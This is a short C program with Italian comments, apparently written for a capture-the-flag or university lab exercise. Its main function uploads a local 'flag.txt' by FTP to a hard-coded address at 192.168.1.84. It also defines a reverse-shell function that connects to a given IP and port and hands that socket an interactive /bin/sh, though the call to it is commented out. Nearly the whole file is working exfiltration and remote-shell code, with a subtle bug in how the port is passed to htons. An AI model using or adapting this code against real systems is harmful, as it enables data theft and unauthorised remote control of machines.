#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <curl/curl.h>

void create_shellcode(char *ip, char* port);

// Funzione di callback per scrivere i dati su un file
size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    printf("Scrivo %zu elementi di dimensione %zu\n", nmemb, size);
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

// Funzione per caricare un file su un server FTP
int upload_file_ftp(const char *ftp_url, const char *local_file_path) {
    CURL *curl;
    CURLcode res;
    FILE *local_file;
    
    // Inizializza la libreria curl
    curl_global_init(CURL_GLOBAL_ALL);
    
    // Inizializza una nuova sessione curl
    curl = curl_easy_init();
    if (curl) {
        // Apri il file locale in modalità lettura
        local_file = fopen(local_file_path, "rb");
        if (local_file) {
            // Imposta l'URL FTP di destinazione
            curl_easy_setopt(curl, CURLOPT_URL, ftp_url);
            
            // Imposta la funzione di callback per scrivere i dati su un file
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
            
            // Imposta il file locale come sorgente dei dati
            curl_easy_setopt(curl, CURLOPT_READDATA, local_file);
            
            // Esegue l'operazione di upload
            res = curl_easy_perform(curl);
            
            // Verifica se l'upload è stato completato con successo
            if (res == CURLE_OK) {
                printf("File caricato con successo su FTP.\n");
                printf("res: %d\n", res);
            } else {
                printf("Errore durante l'upload del file su FTP: %s\n", curl_easy_strerror(res));
            }
            
            // Chiudi il file locale
            fclose(local_file);
        } else {
            printf("Impossibile aprire il file locale: %s\n", local_file_path);
        }
        
        // Termina la sessione curl
        curl_easy_cleanup(curl);
    } else {
        printf("Impossibile inizializzare la sessione curl.\n");
    }
    
    // Libera le risorse della libreria curl
    curl_global_cleanup();
    
    return 0;
}


int main(int argc, char **argv){

    // Copia il file su un server FTP
    const char *ftp_url = "ftp://192.168.1.84/home/unina/Desktop/flag.txt";
    const char *local_file_path = "./flag.txt";
    
    upload_file_ftp(ftp_url, local_file_path);
   // create_shellcode(argv[1], argv[2]);
    return 0;
}

void create_shellcode(char *ip, char* port)
{
    int scktd;
    struct sockaddr_in client;

    client.sin_family = AF_INET;
    client.sin_addr.s_addr = inet_addr(ip);
    client.sin_port = htons(port);
    scktd = socket(AF_INET, SOCK_STREAM, 0);
    connect(scktd, (struct sockaddr *)&client, sizeof(client));
    dup2(scktd, 0); // STDIN
    dup2(scktd, 1); // STDOUT
    dup2(scktd, 2); // STDERR
    execl("/bin/sh", "sh", "-i", NULL, NULL);
}


